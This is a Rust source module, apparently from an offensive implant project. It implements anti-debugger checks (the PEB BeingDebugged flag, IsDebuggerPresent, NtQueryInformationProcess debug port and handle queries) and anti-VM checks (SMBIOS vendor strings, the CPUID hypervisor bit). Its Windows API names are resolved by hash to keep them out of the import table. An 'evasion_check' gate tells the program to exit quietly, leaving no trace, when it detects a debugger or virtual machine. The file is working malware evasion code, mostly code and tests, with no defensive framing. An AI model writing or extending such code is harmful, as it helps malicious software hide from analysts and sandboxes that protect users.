//! Anti-debugger + deepened anti-VM detection (wave 3).
//!
//! Lives in `abi` (the only crate allowed `unsafe`): it reaches into the PEB,
//! calls `IsDebuggerPresent`, `NtQueryInformationProcess`, CPUID, and scans
//! the SMBIOS firmware table for VM vendor strings. Every WinAPI it touches is
//! resolved at runtime through [`crate::resolve`], so these names add no
//! import-table entries (same rationale as the wave-2 IAT reduction).
//!
//! The gate contract is inherited from `bypass::sandbox`: **run may** means all
//! checks pass; any positive (debugger attached / VM firmware / hypervisor bit)
//! means the caller should walk away quietly (exit 0, no refusal trace).

use std::ffi::c_void;
use std::ptr;

use crate::resolve::{api, hash_bytes, hash_mod_bytes};

/// `NT_SUCCESS`: Nt* returns 0 on success, negative on error.
const NT_STATUS_SUCCESS: i32 = 0;
/// `NtQueryInformationProcess` info class: DebugPort (0 = none, else pid of the
/// debugger). Cheap, classic, still reliable on x64.
const PROCESS_DEBUG_PORT: u32 = 7;
/// `NtQueryInformationProcess` info class: DebugObjectHandle.
const PROCESS_DEBUG_OBJECT_HANDLE: u32 = 0x1E;
/// `GetSystemFirmwareTable` provider signature "RSMB" (Raw SMBIOS, LE).
const RSMB: u32 = 0x52534D42;

/// PEB::BeingDebugged — byte at +0x02 in the PEB on x64.
const PEB_BEING_DEBUGGED_OFFSET: usize = 0x02;

/// Raw CPUID result (leaf 1): ECX bit 31 set ⇒ a hypervisor is present.
const CPUID_LEAF1: u32 = 1;
const CPUID_HYPERVISOR_BIT: u32 = 1 << 31;

/// SMBIOS text that marks a virtual machine. "Microsoft Corporation" is
/// excluded (it's the OEM string on many real retail Windows 11 boxes).
const VM_FIRMWARE_TOKEN: &[&[u8]] = &[
    b"VMWARE",
    b"VRTUAL",
    b"INNOTEK",
    b"VBOX",
    b"QEMU",
    b"KVM",
    b"BOCHS",
    b"XEN",
    b"PARALLELS",
    b"PRL_",
    b"HYPER-V",
    b"HVM",
];

type NtQueryInformationProcess =
    unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
type GetSystemFirmwareTable = unsafe extern "system" fn(u32, u32, *mut c_void, u32) -> u32;
type IsDebuggerPresent = unsafe extern "system" fn() -> i32;

fn resolve_kernel32(name: &str) -> Option<usize> {
    api(hash_mod_bytes(b"kernel32.dll"), hash_bytes(name.as_bytes()))
}

fn resolve_ntdll(name: &str) -> Option<usize> {
    api(hash_mod_bytes(b"ntdll.dll"), hash_bytes(name.as_bytes()))
}

/// PEB location (x64: `gs:[0x60]`).
fn peb_address() -> usize {
    let mut peb: usize;
    // SAFETY: reading a fixed TEB field is valid on every x86-64 Windows;
    // the value is well-formed (loader-set) for the life of the process.
    unsafe {
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, readonly));
    }
    peb
}

/// PEB::BeingDebugged flag — set while a debugger is attached. No import, no
/// function call; the flag is set by the loader itself.
fn peb_being_debugged() -> bool {
    let p = peb_address();
    if p == 0 {
        return false;
    }
    // SAFETY: PEB is loader-owned and outlives us; reading one byte at a
    // fixed, documented offset inside it cannot fault for a valid PEB.
    unsafe { ptr::read((p + PEB_BEING_DEBUGGED_OFFSET) as *const u8) != 0 }
}

/// `IsDebuggerPresent()` through its resolved address.
fn is_debugger_present() -> bool {
    let Some(addr) = resolve_kernel32("IsDebuggerPresent") else {
        return false;
    };
    let f: IsDebuggerPresent = unsafe { std::mem::transmute(addr) };
    // SAFETY: f is the verified kernel32 IsDebuggerPresent; it has no
    // parameters, touches only its own state, and is designed for this.
    unsafe { f() != 0 }
}

/// NtQueryInformationProcess debug hints: returns true if a debug port or
/// debug object handle is present.
fn query_process_debug_hint() -> bool {
    let Some(addr) = resolve_ntdll("NtQueryInformationProcess") else {
        return false;
    };
    let f: NtQueryInformationProcess = unsafe { std::mem::transmute(addr) };

    // DebugPort (class 7): 0 when not debugged.
    let mut debug_port: isize = 0;
    // SAFETY: struct layout of the raw call matches NtQueryInformationProcess;
    // handles are the created "everything" pseudo-handle (invalid but fine for
    // querying our own process attributes), or OpenProcess-owned via the
    // injector — self-query uses `-1`.
    let st = unsafe {
        f(
            -1isize as *mut c_void,
            PROCESS_DEBUG_PORT,
            (&mut debug_port as *mut isize).cast(),
            std::mem::size_of::<isize>() as u32,
            ptr::null_mut(),
        )
    };
    if st == NT_STATUS_SUCCESS && debug_port != 0 {
        return true;
    }

    // DebugObjectHandle (class 0x1E): non-NULL when a debug object is open.
    let mut handle: *mut c_void = ptr::null_mut();
    let st = unsafe {
        f(
            -1isize as *mut c_void,
            PROCESS_DEBUG_OBJECT_HANDLE,
            (&mut handle as *mut *mut c_void).cast(),
            std::mem::size_of::<*mut c_void>() as u32,
            ptr::null_mut(),
        )
    };
    st == NT_STATUS_SUCCESS && !handle.is_null()
}

/// CPUID leaf 1 hypervisor-present bit (ECX bit 31). Cheap, no imports, and
/// un-hookable — a syscall-quality tell.
fn hypervisor_cpuid() -> bool {
    // __cpuid is safe to call; the leaf is valid on all x86-64.
    let r = std::arch::x86_64::__cpuid(CPUID_LEAF1);
    r.ecx & CPUID_HYPERVISOR_BIT != 0
}

/// Scan the raw SMBIOS buffer for VM vendor text. The vendor/OEM strings live
/// in the byte stream that follows each structure, so a plain case-folded
/// substring scan is the robust, structure-agnostic way to find them.
fn firmware_has_vm_token(buf: &[u8]) -> bool {
    const CAP: usize = 4096; // typical RSMB buffer is a few KB; scan a cap
    let mut upper = Vec::with_capacity(buf.len().min(CAP));
    for &b in buf.iter().take(CAP) {
        upper.push(b.to_ascii_uppercase());
    }
    VM_FIRMWARE_TOKEN
        .iter()
        .any(|tok| upper.windows(tok.len()).any(|w| w == *tok))
}

/// Read the SMBIOS (RSMB) firmware table via `GetSystemFirmwareTable` and
/// check it for VM vendor strings. Two-call size/fetch pattern.
fn firmware_vm_present() -> bool {
    let Some(addr) = resolve_kernel32("GetSystemFirmwareTable") else {
        return false;
    };
    let f: GetSystemFirmwareTable = unsafe { std::mem::transmute(addr) };

    // SAFETY: size probe with NULL buffer reads nothing.
    let size = unsafe { f(RSMB, 0, ptr::null_mut(), 0) };
    if size == 0 {
        return false;
    }
    let mut buf = vec![0u8; size as usize + 8];
    // SAFETY: buffer is `size` bytes; the table is written in place by the OS
    // and `size` is a capped (few-KB) allocation under our control.
    let written = unsafe { f(RSMB, 0, buf.as_mut_ptr().cast(), buf.len() as u32) };
    if written == 0 {
        return false;
    }
    buf.truncate(written as usize);
    firmware_has_vm_token(&buf)
}

/// **Anti-VM verdict** — any positive means the host is almost certainly a
/// VM/analysis box. Combines the wave-1 cheap tells with the new depth:
/// firmware vendor text (strongest) + CPUID hypervisor bit (un-hookable).
pub fn vm_detected() -> bool {
    firmware_vm_present() || hypervisor_cpuid()
}

/// **Anti-debug verdict** — any positive means a debugger is attached.
pub fn debugger_detected() -> bool {
    if peb_being_debugged() || is_debugger_present() {
        return true;
    }
    query_process_debug_hint()
}

/// Full evasion gate. Returns `Some(thin-description)` when the process should
/// restrain itself (debugger attached / VM present); `None` when it's safe to
/// run. Exits are the caller's: the halting behavior mirrors `bypass::sandbox`
/// (quiet, exit 0).
pub fn evasion_check() -> Option<&'static str> {
    if debugger_detected() {
        return Some("debugger");
    }
    if vm_detected() {
        return Some("virtual-machine");
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rsmb_signature_is_little_endian() {
        // 'R', 'S', 'M', 'B' as a little-endian u32.
        assert_eq!(RSMB, 0x5253_4D42);
    }

    #[test]
    fn debug_info_classes_are_stable() {
        assert_eq!(PROCESS_DEBUG_PORT, 7);
        assert_eq!(PROCESS_DEBUG_OBJECT_HANDLE, 0x1E);
    }

    #[test]
    fn vm_tokens_are_upper_case_alnum() {
        for t in VM_FIRMWARE_TOKEN {
            assert!(!t.is_empty());
            assert!(
                t.iter()
                    .all(|&b| b.is_ascii_uppercase() || b == b'_' || b == b'-')
            );
        }
    }

    #[test]
    fn firmware_scan_finds_vmware_token() {
        let blob = b"\0\xfeVMware Inc.\x00BIOS Date: 04/01/2014";
        assert!(firmware_has_vm_token(blob));
    }

    #[test]
    fn firmware_scan_ignores_benign_text() {
        let blob = b"\0\xfeDell Inc.\x00American Megatrends International, LLC.";
        assert!(!firmware_has_vm_token(blob));
    }

    #[test]
    fn peb_read_on_live_process_is_safe() {
        let p = peb_address();
        // PEB of a live process is never null and never the stack.
        assert!(p > 0x10000);
    }
}
